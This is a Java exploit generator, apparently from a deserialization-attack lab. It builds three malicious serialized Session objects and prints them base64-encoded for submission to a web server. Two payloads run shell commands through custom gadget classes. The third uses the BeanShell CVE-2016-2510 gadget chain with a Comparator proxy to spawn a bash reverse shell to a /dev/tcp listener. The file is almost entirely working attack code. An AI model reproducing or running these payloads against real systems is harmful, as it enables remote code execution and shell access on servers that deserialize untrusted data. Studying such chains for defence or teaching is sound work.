/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payloadgenerator;

import Some3rdLibrary.InoffensiveComparator;
import Some3rdLibrary.DangerousH;
import Some3rdLibrary.DangerousIH;
import Some3rdLibrary.InoffensiveRunnable;
import bsh.EvalError;
import bsh.Interpreter;
import bsh.XThis;
import controllers.Session;
import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;


/**
 *
 * @author Afolgado
 */
public class PayloadGenerator {


    public static void main(String[] args) throws FileNotFoundException, IOException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException, EvalError, Exception {

        
    //Payload1 --> Using DangerousH 3rd library to execute malicious commands
    
        // Create Dangerous Runnable with bad payload on it!
        Runnable payload1 = new DangerousH("touch /tmp/payload1");
        Comparator comparator1 = new InoffensiveComparator();
        
        //Create the class that is gonna be deserialized in the web server side
        Session maliciousSession = new Session(payload1,"admin","test1234",comparator1);
        FileOutputStream fileOut = new FileOutputStream("payload1.ser");
        ObjectOutputStream outStream = new ObjectOutputStream(fileOut);
        outStream.writeObject(maliciousSession);
        outStream.close();
        fileOut.close();
        
        //Create payload and print in console
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream outStream2 = new ObjectOutputStream(bos);
        outStream2.writeObject(maliciousSession);
        outStream2.close();
        String b64secret = new String(Base64.getEncoder().encode(bos.toByteArray()));
        System.out.println("Payload1:"+b64secret);
        
    //Payload2 --> Using DangerousIH 3rd library to execute malicious commands through a proxy method
        
        Runnable runable2 = new InoffensiveRunnable();
        
	// Create Dangerous InvocationHandler with bad payload on it!
	DangerousIH dh = new DangerousIH("touch /tmp/payload2");
        
  

	// Create Comparator Proxy to trick the method invoke when calling compare!
        // 
        // int a = s.getComparator().compare(s.getSecret(), s.getUsername()); ==> s.invoke() from DangerousIH!!
        //
        
        
	Comparator comparator2 = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), 
                new Class<?>[]{Comparator.class},(InvocationHandler) dh);


        //Create the class that is gonna be deserialized in the web server side
        Session maliciousSession2 = new Session(runable2,"admin","test1234",comparator2);
        FileOutputStream fileOut2 = new FileOutputStream("payload2.ser");
        ObjectOutputStream outStream3 = new ObjectOutputStream(fileOut2);
        outStream3.writeObject(maliciousSession2);
        outStream3.close();
        fileOut2.close();
        
        //Create payload and print in console
        ByteArrayOutputStream bos2 = new ByteArrayOutputStream();
        ObjectOutputStream outStream4 = new ObjectOutputStream(bos2);
        outStream4.writeObject(maliciousSession2);
        outStream4.close();
        String b64secret2 = new String(Base64.getEncoder().encode(bos2.toByteArray()));
        System.out.println("Payload2:"+b64secret2);
        
        
        
  //Payload3 --> Beanshell CVE-2016-2510. Similar to the precious one, we trigger compare to execute invoke from xThis!!
        
        
        Runnable runable3 = new InoffensiveRunnable();
        
        //Payload is a reverse shell, improvement from author!!
        String payload2 = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"bash\",\"-c\",\"bash -i > /dev/tcp/127.0.0.1/4444 0>&1\"}).start(); return new Integer(1);}";

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload2);

	// Create Xthis Class by giving the right inputs

	XThis xt = new XThis(i.getNameSpace(), i);
        
        
        //We need to get the inner class "handler" in xThis,and set it to be accessible.
        //This innr class is the one implementing the method "invoke" that we need
        Field field1 = xt.getClass().getDeclaredField("invocationHandler");
	field1.setAccessible(true);
        
        
        
	InvocationHandler handler2 = (InvocationHandler) field1.get(xt);
        
        // Create Comparator Proxy to trick the method invoke when calling compare!
        // 
        // int a = s.getComparator().compare(s.getSecret(), s.getUsername()); ==> s.invoke() from DangerousIH!!
        //
        Comparator comparator3 = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class},handler2);


        //Create the class that is gonna be deserialized in the web server side
        Session maliciousSession3 = new Session(runable3,"admin","test1234",comparator3);

        
        //Create payload and print in console
        ByteArrayOutputStream bos3 = new ByteArrayOutputStream();
        ObjectOutputStream outStream6 = new ObjectOutputStream(bos3);
        outStream6.writeObject(maliciousSession3);
        outStream6.close();
        String b64secret3 = new String(Base64.getEncoder().encode(bos3.toByteArray()));
        System.out.println("Payload3:"+b64secret3);
        
        
        
    }
    
}
